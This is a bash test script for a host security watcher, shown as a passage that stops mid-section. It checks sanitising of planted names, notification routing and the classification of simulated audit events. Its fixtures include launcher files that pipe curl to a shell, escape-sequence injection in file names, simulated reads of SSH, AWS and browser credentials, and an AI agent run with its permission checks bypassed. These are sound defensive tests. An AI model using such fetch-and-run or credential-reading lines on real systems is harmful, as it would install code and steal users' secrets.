#!/usr/bin/bash
# The security watcher against what an account can plant, for 20-tests.sh: text it wrote (here a launcher's
# file name holding a newline, an escape sequence and markup) reaches the history, the unread list, the
# Events page's file, a notification and `--show` only as plain text; a launcher linked to a file that never
# ends cannot keep a run waiting; and every finding carries its facts. Runs as root, as the watcher does,
# against a stand-in /etc/passwd, /var/home, state and logs, with a stand-in for the notification.

set -euo pipefail

WATCH="${1:-/usr/libexec/amethystora-security-watch}"
TEXT=/usr/libexec/amethystora-security-text
T="$(realpath "$(mktemp -d)")"
trap 'rm -rf "${T}"' EXIT
chmod 0755 "${T}"
fail() { echo "test-security-watch: $*" >&2; exit 1; }
ESC=$'\e'

# --- The text filter on its own -------------------------------------------------------------------------

out="$("${TEXT}" "a${ESC}]0;title${ESC}\\b"$'\n'"c"$'\r'"d"$'\xc2\x9b'"e")"
[[ "${out}" == "a]0;title\\b cde" ]] || fail "control characters, a newline or a C1 character got through: $(printf '%q' "${out}")"
out="$("${TEXT}" $'X\x8a\x9bS\xff\x01')"
[[ "${out}" == $'X\xef\xbf\xbd\xef\xbf\xbdS\xef\xbf\xbd' ]] || fail "bytes that are not UTF-8 got through: $(printf '%q' "${out}")"
out="$("${TEXT}" --lines $'one\ntwo')"
[[ "${out}" == $'one\ntwo' ]] || fail "--lines did not keep the lines"
out="$("${TEXT}" --markup '<a href="x">&')"
[[ "${out}" == '&lt;a href="x"&gt;&amp;' ]] || fail "--markup: ${out}"
out="$("${TEXT}" --max 5 'abcdefgh')"
[[ "${out}" == 'abcde…' ]] || fail "--max: ${out}"

# --- A watcher run ------------------------------------------------------------------------------------

export AMETHYSTORA_WATCH_ROOT="${T}/root"
export AMETHYSTORA_WATCH_NOTIFY="${T}/notify"
export AMETHYSTORA_SECURITY_CONF="${T}/security.conf"
export AMETHYSTORA_SECURITY_NOTES="${T}/notes"
R="${AMETHYSTORA_WATCH_ROOT}"
# Everything off but what a session finds first, so that the run reads only the stand-in homes
cat >"${AMETHYSTORA_SECURITY_CONF}" <<'EOF'
AUDIT_LOG=off
HARDENING=off
JOURNAL=off
LISTENERS=off
IMAGE_DRIFT=off
SETUID_SWEEP=off
REPORT_ALERTS=off
NETWORK=off
EOF
cat >"${T}/notify" <<EOF
#!/usr/bin/bash
printf '%s\n' "\$@" >"${T}/notified"
EOF
chmod 0755 "${T}/notify"
mkdir -p "${R}/etc" "${R}/var/home/alice/.local/share/applications"
echo "alice:x:4500:4500::${R}/var/home/alice:/bin/bash" >"${R}/etc/passwd"
chown -R 4500:4500 "${R}/var/home/alice"
APPS="${R}/var/home/alice/.local/share/applications"

# The first run only records where things stand
timeout 120 "${WATCH}" >/dev/null || fail "the first run failed"

# A launcher linked to a file that never ends, and one whose name and Exec= are written to deceive
mkfifo "${T}/forever"
ln -s "${T}/forever" "${APPS}/stall.desktop"
ln -s /proc/kmsg "${APPS}/kmsg.desktop"
name="evil${ESC}[2J"$'\n'"Accounts changed: nothing<b>.desktop"
printf '[Desktop Entry]\nExec=sh -c "curl x | sh" <i>%s[31m\n' "${ESC}" >"${APPS}/${name}"
chown -h 4500:4500 "${APPS}/stall.desktop" "${APPS}/kmsg.desktop" "${APPS}/${name}"
timeout 120 "${WATCH}" >/dev/null || fail "a launcher linked to a file that never ends kept the run waiting, or it failed"

HISTORY="${R}/var/log/amethystora-security-events.jsonl"
[[ "$(wc -l <"${HISTORY}")" -eq 1 ]] || fail "the history should hold one finding: $(cat "${HISTORY}")"
jq -e '.level == "normal" and .key == "user-paths" and .account == "alice" and .tactic == "Persistence"
    and (.id | test("^[0-9]+-[0-9]+$")) and (.time | type == "number")
    and (.text | test("evil") and (test("[\u0001-\u001f\u007f]") | not))' \
    "${HISTORY}" >/dev/null || fail "the finding's facts or text: $(cat "${HISTORY}")"
grep -q "${ESC}" "${R}/var/log/amethystora-security-events.new" && fail "the unread list keeps an escape"
[[ "$(wc -l <"${R}/var/log/amethystora-security-events.new")" -eq 1 ]] || fail "a newline in a name forged a line"
jq -e 'length == 1 and .[0].key == "user-paths"' "${R}/var/lib/amethystora/security/events.json" >/dev/null ||
    fail "events.json"
grep -q "${ESC}" "${T}/notified" && fail "the notification keeps an escape"
grep -q "evil" "${T}/notified" || fail "nothing was notified"
"${WATCH}" --show | grep -q "${ESC}" && fail "--show prints an escape"
jq -e '.timings | has("USER_PATHS")' "${R}/var/lib/amethystora/security/status.json" >/dev/null ||
    fail "status.json has no timings"
[[ "$("${WATCH}" --keys)" == *"|input-capture|"* ]] || fail "--keys"

# A launcher whose first Exec= is one a container export writes, and whose last, the one GLib runs, is not
printf '[Desktop Entry]\nExec=distrobox-enter -n box -- tool\nExec=sh -c "curl y | sh"\n' >"${APPS}/decoy.desktop"
chown 4500:4500 "${APPS}/decoy.desktop"
timeout 120 "${WATCH}" >/dev/null || fail "the run after the decoy launcher failed"
grep -q "decoy.desktop" "${HISTORY}" || fail "a launcher that opens with a container's Exec= was not said"

# --- What only an account can see -----------------------------------------------------------------------

# A reader runs as the account, and the watcher says what is new in what it printed: to that account alone,
# not what came with something new, and not what the owner allowed. Its first run only records.
cat >"${AMETHYSTORA_SECURITY_CONF}" <<'EOF'
AUDIT_LOG=off
HARDENING=off
JOURNAL=off
LISTENERS=off
IMAGE_DRIFT=off
SETUID_SWEEP=off
REPORT_ALERTS=off
USER_PATHS=off
NETWORK=off
APP_PERMISSIONS=on
EOF
export AMETHYSTORA_WATCH_READER="${T}/reader" AMETHYSTORA_WATCH_ACCOUNTS=4500
cat >"${T}/reader" <<EOF
#!/usr/bin/bash
[[ "\$(id -u)" == 4500 && "\${HOME}" == "${R}/var/home/alice" && "\$1" == app-permissions ]] || exit 1
# Its standard input is nothing: the pipe the accounts are read from is not for an account's programs
[[ "\$(readlink /proc/\$\$/fd/0)" == /dev/null ]] || exit 1
cat "${T}/read"
EOF
chmod 0755 "${T}/reader"
printf '%s\n' '{"id":"org.a.App","level":"quiet","text":"org.a.App was installed"}' \
    '{"id":"org.a.App session-bus","within":"org.a.App","level":"normal","text":"org.a.App can talk to the session"}' >"${T}/read"
chmod 0644 "${T}/read"
rm -f "${T}/notified"
timeout 120 "${WATCH}" >/dev/null || fail "the reader's first run failed"
[[ -e "${T}/notified" ]] && fail "a reader's first run said something"
grep -qx "org.a.App session-bus" "${R}/var/lib/amethystora/security/accounts/4500/app-permissions.seen" ||
    fail "the reader's first run was not kept"
printf '%s\n' '{"id":"org.b.New","level":"quiet","text":"org.b.New was installed"}' \
    '{"id":"org.b.New session-bus","within":"org.b.New","level":"normal","text":"org.b.New can talk to the session"}' \
    '{"id":"org.a.App flatpak","within":"org.a.App","level":"normal","allow":"org.a.App flatpak","text":"org.a.App can now run programs\u001b[2J outside"}' \
    >>"${T}/read"
timeout 120 "${WATCH}" >/dev/null || fail "the reader's second run failed"
jq -se 'map(select(.key == "app-permissions")) | length == 3
    and any(.[]; .text | test("run programs") and (test("\u001b") | not)) and all(.[]; .account == "alice" and .tell == "alice")
    and ([.[] | select(.level != "quiet") | .allow] == ["org.a.App flatpak"])' "${HISTORY}" >/dev/null ||
    fail "what the reader found: $(grep app-permissions "${HISTORY}")"
grep -qx -- "--user" "${T}/notified" && grep -qx alice "${T}/notified" || fail "a finding about alice's apps was not said to alice alone"
grep -qx -- "--admins" "${T}/notified" && fail "a finding about alice's apps was said to the administrators"
# What the owner allowed is recorded, not said
mkdir -p "${R}/etc/amethystora/allow.d"
echo 'org.c.* *' >"${R}/etc/amethystora/allow.d/app-permissions"
echo '{"id":"org.a.App org.c","within":"org.a.App","level":"normal","allow":"org.c.Other systemd","text":"allowed"}' >>"${T}/read"
rm -f "${T}/notified"
timeout 120 "${WATCH}" >/dev/null || fail "the reader's third run failed"
[[ -e "${T}/notified" ]] && fail "what the owner allowed was said"
jq -se 'any(.[]; .text == "allowed" and .level == "quiet")' "${HISTORY}" >/dev/null || fail "what the owner allowed was not recorded"

# An account's own programs can stop or kill its reader: a run that was ended is not one that found nothing. The
# second in a row is a finding of its own, said once; a run that ends well starts the count again
cp "${T}/reader" "${T}/reader.ok"
printf '#!/usr/bin/bash\nkill -9 $$\n' >"${T}/reader"
for run in 1 2 3; do
    before="$(wc -l <"${HISTORY}")"
    timeout 120 "${WATCH}" >/dev/null || fail "a run with a killed reader failed"
    cut="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "app-permissions" and (.text | test("did not finish")))')"
    case "${run}" in
        2) jq -se 'length == 1 and .[0].account == "alice" and .[0].level == "normal"' <<<"${cut}" >/dev/null ||
               fail "a reader killed twice was not said: ${cut}" ;;
        *) [[ -z "${cut}" ]] || fail "a reader killed (run ${run}) was said: ${cut}" ;;
    esac
done
cp "${T}/reader.ok" "${T}/reader"
timeout 120 "${WATCH}" >/dev/null || fail "a run with the reader back failed"
[[ ! -e "${R}/var/lib/amethystora/security/accounts/4500/app-permissions.cut" ]] || fail "a good run did not start the count again"

# --- What the app integrity check found ------------------------------------------------------------------------

# Its findings, in the readers' form, are said when new: one about the system's apps to the administrators, one
# about alice's own to alice and to the administrators. The report gets the system's sentences, and of alice's
# only which app; nothing is said twice.
echo "APP_INTEGRITY=on" >>"${AMETHYSTORA_SECURITY_CONF}"
I="${R}/var/lib/amethystora/security/integrity"
mkdir -p -m 0700 "${I}"
echo '{"time": 1790000000, "sealed": false, "system": {"objects": 9, "deployments": 1}, "flatpak": {"apps": 3}, "accounts": {"alice": {"apps": 1}}}' >"${I}/last.json"
printf '%s\n' '{"id":"file:-:app/org.a.App/x86_64/stable:files/bin/a","level":"critical","tactic":"Persistence","account":"-","installation":"system","app":"org.a.App","text":"A file of the Flatpak app org.a.App changed outside an update: files/bin/a\u001b[2J"}' \
    '{"id":"alice:file:account:app/org.b.Mine/x86_64/stable:files/x","level":"critical","tactic":"Persistence","account":"alice","installation":"user","app":"org.b.Mine","text":"A file of the Flatpak app org.b.Mine changed outside an update: files/x"}' \
    >"${I}/findings.jsonl"
printf '#!/usr/bin/bash\nprintf "%%s\\n" "$@" >>"%s/notified"\n' "${T}" >"${T}/notify"
rm -f "${T}/notified"
timeout 120 "${WATCH}" >/dev/null || fail "the run reading the app integrity check failed"
FOUND="$(jq -c 'select(.key == "app-integrity")' "${HISTORY}")"
jq -se 'length == 2 and all(.[]; .level == "critical" and .tactic == "Persistence")
    and any(.[]; .account == "-" and (.text | test("org.a.App") and (test("\u001b") | not)) and (has("tell") | not))
    and any(.[]; .account == "alice" and .tell == "alice")' <<<"${FOUND}" >/dev/null || fail "what the check found: ${FOUND}"
grep -qx -- "--user" "${T}/notified" && grep -qx -- "--admins" "${T}/notified" ||
    fail "a change to alice's own app was not said to alice and to the administrators: $(cat "${T}/notified")"
jq -e '.integrity.flatpak.apps == 3 and (.integrity.findings | length == 2)
    and any(.integrity.findings[]; .account == "-" and (.text | test("org.a.App")))
    and any(.integrity.findings[]; .account == "alice" and .app == "org.b.Mine" and (has("text") | not))' \
    "${R}/var/lib/amethystora/security/status.json" >/dev/null || fail "the report's view: $(jq -c .integrity "${R}/var/lib/amethystora/security/status.json")"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the second run reading the app integrity check failed"
tail -n +"$((before + 1))" "${HISTORY}" | grep -q '"key":"app-integrity"' && fail "what the check found was said twice"
sed -i '/^APP_INTEGRITY=on$/d' "${AMETHYSTORA_SECURITY_CONF}"
printf '#!/usr/bin/bash\nprintf "%%s\\n" "$@" >"%s/notified"\n' "${T}" >"${T}/notify"

# --- What the audit log holds, from a stand-in log in the kernel's raw form ---------------------------------

unset AMETHYSTORA_WATCH_READER AMETHYSTORA_WATCH_ACCOUNTS
export AMETHYSTORA_WATCH_AUDIT="${T}/audit.log"
cat >"${AMETHYSTORA_SECURITY_CONF}" <<'EOF'
HARDENING=off
JOURNAL=off
LISTENERS=off
IMAGE_DRIFT=off
SETUID_SWEEP=off
REPORT_ALERTS=off
USER_PATHS=off
NETWORK=off
IDENTITY=off
PRIVILEGE=off
PERSISTENCE=off
MODULES=off
INPUT_CAPTURE=off
USER_PROGRAMS=off
SELINUX_DENIALS=on
EOF
# Each audit record after the run before, so that it is new to this one. ausearch gives an event only once
# one more than two seconds newer has come, as on a machine one always does: close() writes that one.
# The records of each step are written that many seconds after the test began (STEP), in order.
BEGAN="$(date +%s)"
STEP=1
close() { printf 'type=USER_START msg=audit(%s.100:%s): pid=1 uid=0 auid=0 ses=1 msg=x\n' "$((BEGAN + STEP + 20))" "$1"; }
avc() {
    printf 'type=AVC msg=audit(%s.100:%s): avc:  denied  { %s } for  pid=4242 comm=%s name="shadow" dev="dm-0" ino=7 scontext=system_u:system_r:%s:s0 tcontext=system_u:object_r:%s:s0 tclass=file permissive=%s\n' \
        "$((BEGAN + STEP))" "$1" "$2" "$3" "$4" "$5" "$6"
}
{
    avc 101 "read open" '"evil"' httpd_t shadow_t 0
    avc 102 "read open" '"evil"' httpd_t shadow_t 0
    avc 103 "write" 6576696C1B5B324A unconfined_service_t etc_t 1
    close 199
} >"${AMETHYSTORA_WATCH_AUDIT}"
chmod 0600 "${AMETHYSTORA_WATCH_AUDIT}"
sleep 2
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run with SELinux denials failed"
SELINUX_FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "selinux-denials")')"
jq -se 'length == 2 and (.[0].level == "normal" and .[0].allow == "httpd_t shadow_t file read,open"
    and (.[0].text | test("SELinux kept evil \\(httpd_t\\) from read, open on a file of type shadow_t")))
    and (.[1].level == "quiet" and (.[1].text | test("permissive")))' <<<"${SELINUX_FOUND}" >/dev/null ||
    fail "SELinux's denials: ${SELINUX_FOUND}"
# The same denial again is not news
STEP=30
{ avc 104 "read open" '"evil"' httpd_t shadow_t 0; close 299; } >>"${AMETHYSTORA_WATCH_AUDIT}"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the second run with SELinux denials failed"
tail -n +"$((before + 1))" "${HISTORY}" | grep -q selinux-denials && fail "the same denial was said twice"

# A program run from a writable folder, as the kernel records it: said once, by what is in it, and one gone,
# with a name the kernel wrote in hex, by its name made plain
echo "EXEC_WATCH=on" >>"${AMETHYSTORA_SECURITY_CONF}"
cp /usr/bin/true /var/tmp/watch-exec
execution() {
    # ausearch reads a SYSCALL record only with all of a real one's fields, a0 to a3 included
    printf 'type=SYSCALL msg=audit(%s.100:%s): arch=c000003e syscall=59 success=yes exit=0 a0=55d0 a1=55d1 a2=55d2 a3=0 items=2 ppid=10 pid=11 auid=4500 uid=4500 gid=4500 euid=4500 suid=4500 fsuid=4500 egid=4500 sgid=4500 fsgid=4500 tty=(none) ses=3 comm="x" exe=%s subj=unconfined_u:unconfined_r:unconfined_t:s0 key="exec-watch"\n' \
        "$((BEGAN + STEP))" "$1" "$2"
    printf 'type=EXECVE msg=audit(%s.100:%s): argc=2 a0=%s a1="--now"\n' "$((BEGAN + STEP))" "$1" "$2"
    printf 'type=CWD msg=audit(%s.100:%s): cwd="/root"\n' "$((BEGAN + STEP))" "$1"
    printf 'type=PATH msg=audit(%s.100:%s): item=0 name=%s inode=1 dev=00:01 nametype=NORMAL\n' "$((BEGAN + STEP))" "$1" "$2"
}
STEP=60
{
    execution 401 '"/var/tmp/watch-exec"'
    execution 402 2F7661722F746D702F6120621B5B324A
    execution 403 '"/var/tmp/watch-exec"'
    close 499
} >>"${AMETHYSTORA_WATCH_AUDIT}"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run with programs run from writable folders failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "exec-watch")')"
jq -se 'length == 2 and any(.[]; .text == "A program ran for the first time from where downloads and temporary files land: /var/tmp/watch-exec, as 4500"
        and .allow == "/var/tmp/watch-exec" and .tactic == "Execution")
    and any(.[]; .text | test("/var/tmp/a b\\?\\[2J"))' <<<"${FOUND}" >/dev/null || fail "programs run from writable folders: ${FOUND}"
rm -f /var/tmp/watch-exec

# An agent run with its checks off: said with no terminal, once for however many runs, recorded at one, and
# not at all without a flag
echo "AGENT_CLIS=on" >>"${AMETHYSTORA_SECURITY_CONF}"
agent_run() {
    local serial="$1" tty="$2" index=0 arg
    shift 2
    printf 'type=SYSCALL msg=audit(%s.100:%s): arch=c000003e syscall=59 success=yes exit=0 a0=55d0 a1=55d1 a2=55d2 a3=0 items=2 ppid=1 pid=12 auid=4500 uid=4500 gid=4500 euid=4500 suid=4500 fsuid=4500 egid=4500 sgid=4500 fsgid=4500 tty=%s ses=3 comm="claude" exe="/var/home/alice/.local/share/claude/versions/2.1.0" subj=unconfined_u:unconfined_r:unconfined_t:s0 key="agent-clis"\n' \
        "$((BEGAN + STEP))" "${serial}" "${tty}"
    printf 'type=EXECVE msg=audit(%s.100:%s): argc=%s' "$((BEGAN + STEP))" "${serial}" "$#"
    for arg in "$@"; do
        printf ' a%s="%s"' "${index}" "${arg}"
        index=$((index + 1))
    done
    echo
}
STEP=90
{
    agent_run 501 "(none)" claude --dangerously-skip-permissions -p hi
    agent_run 502 "(none)" claude --dangerously-skip-permissions
    agent_run 503 pts0 claude --permission-mode=bypassPermissions
    agent_run 504 "(none)" claude --help
    close 599
} >>"${AMETHYSTORA_WATCH_AUDIT}"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run with agents failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "agent-clis")')"
PARENT="$(readlink /proc/1/exe)"
jq -se --arg parent "${PARENT}" 'length == 2
    and any(.[]; .level == "normal" and .allow == $parent and .text == "An AI agent ran with its own checks turned off: claude --dangerously-skip-permissions, started by \($parent) with no terminal (2 times)")
    and any(.[]; .level == "quiet" and (.text | test("claude --permission-mode bypassPermissions, started by .* at a terminal$")))' \
    <<<"${FOUND}" >/dev/null || fail "agents run with their checks off: ${FOUND}"

# Reading where secrets are kept: a program not on a file's list is said, one sweeping two kinds is critical,
# ssh reading its keys is nothing; and any read of the decoy is critical, but the backup's
printf 'CREDENTIALS=on\nDECOY=on\n' >>"${AMETHYSTORA_SECURITY_CONF}"
opened() {
    printf 'type=SYSCALL msg=audit(%s.100:%s): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=55d1 a2=0 a3=0 items=1 ppid=1 pid=%s auid=4500 uid=4500 gid=4500 euid=4500 suid=4500 fsuid=4500 egid=4500 sgid=4500 fsgid=4500 tty=(none) ses=3 comm="x" exe="%s" subj=unconfined_u:unconfined_r:unconfined_t:s0 key="%s"\n' \
        "$((BEGAN + STEP))" "$1" "$2" "$3" "$5"
    printf 'type=CWD msg=audit(%s.100:%s): cwd="/var/home/alice"\n' "$((BEGAN + STEP))" "$1"
    printf 'type=PATH msg=audit(%s.100:%s): item=0 name="%s" inode=1 dev=00:01 nametype=NORMAL\n' "$((BEGAN + STEP))" "$1" "$4"
}
STEP=120
{
    opened 601 21 /usr/bin/python3.14 /var/home/alice/.ssh/id_ed25519 credentials
    opened 602 21 /usr/bin/python3.14 .aws/credentials credentials
    opened 603 22 /usr/bin/ssh /var/home/alice/.ssh/id_ed25519 credentials
    opened 604 23 /usr/bin/cat /var/home/alice/.ssh/id_backup decoy
    opened 605 24 /usr/bin/restic /var/home/alice/.ssh/id_backup decoy
    # A name with a space, as the audit log writes it: in hex
    opened 606 25 /usr/bin/cp "$(printf '%s' "/var/home/alice/.config/chromium/Default/Login Data" | od -An -tx1 | tr -d ' \n' | tr a-f A-F)" credentials |
        sed 's/name="\([0-9A-F]*\)"/name=\1/'
    close 699
} >>"${AMETHYSTORA_WATCH_AUDIT}"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run with secrets read failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "credentials" or .key == "decoy")')"
jq -se 'length == 6
    and any(.[]; .key == "credentials" and .text == "/usr/bin/cp read /var/home/alice/.config/chromium/Default/Login Data (a browser'"'"'s passwords), as 4500")
    and any(.[]; .key == "credentials" and .level == "normal" and .text == "/usr/bin/python3.14 read /var/home/alice/.ssh/id_ed25519 (SSH keys), as 4500")
    and any(.[]; .key == "credentials" and .level == "normal" and (.text | test("read /var/home/alice/.aws/credentials .AWS keys.")))
    and any(.[]; .key == "credentials" and .level == "critical" and (.text | test("process 21, as 4500. read (SSH keys, AWS keys|AWS keys, SSH keys)$")))
    and any(.[]; .key == "decoy" and .level == "critical" and (.text | startswith("/usr/bin/cat read the decoy key")))
    and any(.[]; .key == "decoy" and .level == "quiet" and (.text | startswith("/usr/bin/restic")))
    and all(.[]; (.text | test("/usr/bin/ssh ")) | not)' <<<"${FOUND}" >/dev/null || fail "secrets read: ${FOUND}"

# Steps of one attack: a program run from the downloads and a secret read, for one account, are a chain,
# said once; what the owner allowed builds none
echo "CHAINS=on" >>"${AMETHYSTORA_SECURITY_CONF}"
# Another program than the one run before, which was said already: a byte more makes it one
cp /usr/bin/true /var/tmp/watch-chain
printf x >>/var/tmp/watch-chain
STEP=150
{
    execution 701 '"/var/tmp/watch-chain"'
    opened 702 31 /usr/bin/perl /var/home/alice/.npmrc credentials
    close 799
} >>"${AMETHYSTORA_WATCH_AUDIT}"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run with a chain failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "chains")')"
jq -se 'length == 1 and .[0].level == "normal" and .[0].account == "4500"
    and (.[0].text | test("Credential Access .credentials.") and test("Execution .exec-watch."))' <<<"${FOUND}" >/dev/null ||
    fail "a chain of steps: ${FOUND}"
STEP=180
{ opened 801 32 /usr/bin/perl /var/home/alice/.pypirc credentials; close 899; } >>"${AMETHYSTORA_WATCH_AUDIT}"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the second run with a chain failed"
tail -n +"$((before + 1))" "${HISTORY}" | grep -q '"key":"chains"' && fail "the same chain was said twice"
rm -f /var/tmp/watch-chain

# What an ordinary boot and login write, as a real machine's audit log had it: the rules loaded at boot are no
# change at all, GNOME Shell taking away a file that is not there changed nothing, SSH meeting a new host
# is the image's allowlist's, and the user manager symlinking a unit into a .wants directory (a login's own
# enable-and-disable churn) is recorded only; an autostart entry is still said
printf 'PERSISTENCE=on\nHARDENING=on\n' >>"${AMETHYSTORA_SECURITY_CONF}"
STEP=210
{
    printf 'type=CONFIG_CHANGE msg=audit(%s.100:901): auid=4294967295 ses=4294967295 subj=system_u:system_r:unconfined_service_t:s0 op=add_rule key="hardening" list=4 res=1\n' "$((BEGAN + STEP))"
    printf 'type=SYSCALL msg=audit(%s.100:901): arch=c000003e syscall=44 success=yes exit=1088 a0=3 a1=7ffe a2=440 a3=0 items=0 ppid=846 pid=876 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/bin/auditctl" subj=system_u:system_r:unconfined_service_t:s0 key=(null)\n' "$((BEGAN + STEP))"
    printf 'type=SYSCALL msg=audit(%s.100:902): arch=c000003e syscall=87 success=no exit=-2 a0=564d a1=1 a2=7ffe a3=0 items=1 ppid=1548 pid=1824 auid=4500 uid=4500 gid=4500 euid=4500 suid=4500 fsuid=4500 egid=4500 sgid=4500 fsgid=4500 tty=(none) ses=2 comm="gnome-shell" exe="/usr/bin/gnome-shell" subj=unconfined_u:unconfined_r:unconfined_t:s0 key="persistence"\n' "$((BEGAN + STEP))"
    printf 'type=CWD msg=audit(%s.100:902): cwd="/var/home/alice"\n' "$((BEGAN + STEP))"
    printf 'type=PATH msg=audit(%s.100:902): item=0 name="/var/home/alice/.local/share/dbus-1/services/" inode=2 dev=00:01 mode=040700 ouid=4500 ogid=4500 rdev=00:00 nametype=PARENT\n' "$((BEGAN + STEP))"
    # Without the end of the event, ausearch names no path for a removal
    printf 'type=PROCTITLE msg=audit(%s.100:902): proctitle=2F7573722F62696E2F676E6F6D652D7368656C6C\n' "$((BEGAN + STEP))"
    opened 903 41 /usr/bin/ssh /var/home/alice/.ssh/known_hosts persistence
    opened 904 42 /usr/bin/cp /var/home/alice/.config/autostart/watch-start.desktop persistence
    # The user manager enabling a unit at login: a symlink into graphical-session.target.wants, which the
    # plugin host writes and removes every session. Recorded, not announced; the unit it points to is watched.
    printf 'type=SYSCALL msg=audit(%s.100:906): arch=c000003e syscall=266 success=yes exit=0 a0=ffffff9c a1=55d1 a2=55d2 a3=0 items=2 ppid=1 pid=1830 auid=4500 uid=4500 gid=4500 euid=4500 suid=4500 fsuid=4500 egid=4500 sgid=4500 fsgid=4500 tty=(none) ses=2 comm="systemd" exe="/usr/lib/systemd/systemd" subj=unconfined_u:unconfined_r:unconfined_t:s0 key="persistence"\n' "$((BEGAN + STEP))"
    printf 'type=CWD msg=audit(%s.100:906): cwd="/var/home/alice"\n' "$((BEGAN + STEP))"
    printf 'type=PATH msg=audit(%s.100:906): item=0 name="/var/home/alice/.config/systemd/user/graphical-session.target.wants/" inode=10 dev=00:01 mode=040755 ouid=4500 ogid=4500 rdev=00:00 nametype=PARENT\n' "$((BEGAN + STEP))"
    printf 'type=PATH msg=audit(%s.100:906): item=1 name="/var/home/alice/.config/systemd/user/graphical-session.target.wants/amethystora-plugin-host.service" inode=11 dev=00:01 mode=0120777 ouid=4500 ogid=4500 rdev=00:00 nametype=CREATE\n' "$((BEGAN + STEP))"
    printf 'type=PROCTITLE msg=audit(%s.100:906): proctitle=73797374656D64\n' "$((BEGAN + STEP))"
    # sssd.service setting the mode of its folder, which the allowlist names without the mode it was given
    printf 'type=SYSCALL msg=audit(%s.100:905): arch=c000003e syscall=268 success=yes exit=0 a0=ffffff9c a1=55d1 a2=1e8 a3=0 items=1 ppid=1 pid=43 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="chmod" exe="/usr/bin/chmod" subj=system_u:system_r:unconfined_service_t:s0 key="hardening"\n' "$((BEGAN + STEP))"
    printf 'type=CWD msg=audit(%s.100:905): cwd="/"\n' "$((BEGAN + STEP))"
    printf 'type=PATH msg=audit(%s.100:905): item=0 name="/etc/sssd" inode=3 dev=00:01 mode=040750 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL\n' "$((BEGAN + STEP))"
    printf 'type=PROCTITLE msg=audit(%s.100:905): proctitle=63686D6F64\n' "$((BEGAN + STEP))"
    close 999
} >>"${AMETHYSTORA_WATCH_AUDIT}"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run with a boot's and a login's writes failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "persistence" or .key == "hardening")')"
jq -se 'length == 5
    and all(.[]; (.text | test("add_rule")) | not)
    and any(.[]; .key == "hardening" and .level == "quiet" and .allow == "/etc/sssd" and .allowed == "yes")
    and any(.[]; .level == "quiet" and (.text | test("unsuccessfully deleted /var/home/alice/.local/share/dbus-1/services/")))
    and any(.[]; .level == "quiet" and .allowed == "yes" and (.text | test("/var/home/alice/.ssh/known_hosts using /usr/bin/ssh")))
    and any(.[]; .level == "quiet" and (.text | test("symlinked to /var/home/alice/.config/systemd/user/graphical-session.target.wants/ using /usr/lib/systemd/systemd")))
    and any(.[]; .level == "normal" and (.text | test("autostart/watch-start.desktop")))' <<<"${FOUND}" >/dev/null ||
    fail "a boot's and a login's writes: ${FOUND}"

# Just after a switch's note, what root did is that switch's change and recorded; an autostart entry an account's
# own program wrote then is still said
STEP=240
printf '%s\tnetwork-daemons\ton\n' "$((BEGAN + STEP))" >>"${R}/var/lib/amethystora/security/notes"
{
    printf 'type=SYSCALL msg=audit(%s.100:951): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=55d1 a2=241 a3=1b6 items=1 ppid=1 pid=51 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="systemctl" exe="/usr/bin/systemctl" subj=system_u:system_r:unconfined_service_t:s0 key="persistence"\n' "$((BEGAN + STEP))"
    printf 'type=CWD msg=audit(%s.100:951): cwd="/"\n' "$((BEGAN + STEP))"
    printf 'type=PATH msg=audit(%s.100:951): item=0 name="/etc/systemd/system/watch-switch.service" inode=5 dev=00:01 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL\n' "$((BEGAN + STEP))"
    printf 'type=PROCTITLE msg=audit(%s.100:951): proctitle=73797374656D63746C\n' "$((BEGAN + STEP))"
    opened 952 52 /usr/bin/cp /var/home/alice/.config/autostart/watch-after-switch.desktop persistence
    close 1099
} >>"${AMETHYSTORA_WATCH_AUDIT}"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run after a switch's note failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "persistence")')"
jq -se 'length == 2
    and any(.[]; .level == "quiet" and (.text | test("acting as root, successfully opened-file /etc/systemd/system/watch-switch.service")))
    and any(.[]; .level == "normal" and (.text | test("autostart/watch-after-switch.desktop")))' <<<"${FOUND}" >/dev/null ||
    fail "what was written just after a switch: ${FOUND}"
: >"${R}/var/lib/amethystora/security/notes"
printf 'PERSISTENCE=off\nHARDENING=off\n' >>"${AMETHYSTORA_SECURITY_CONF}"

# Reaching into another program's memory, from the audit rules' records alone, which name no program reached:
# it is looked up while it still runs, by the pid among the call's arguments
echo "INJECTION=on" >>"${AMETHYSTORA_SECURITY_CONF}"
sleep 600 &
